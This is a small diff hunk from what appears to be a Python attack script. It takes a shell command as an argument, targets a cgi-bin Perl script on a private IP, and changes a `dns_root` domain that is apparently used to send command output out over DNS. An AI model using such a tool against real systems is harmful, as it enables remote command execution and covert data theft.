@@ -119,7 +119,7 @@ if __name__ == "__main__":
     cmd = args.c
     #cmd = "ifconfig"
 
-    dns_root = "m.z3.vc"
+    dns_root = "m.my.dns"
 
     #Target URL
     url = "http://192.168.241.130/cgi-bin/test2.pl"
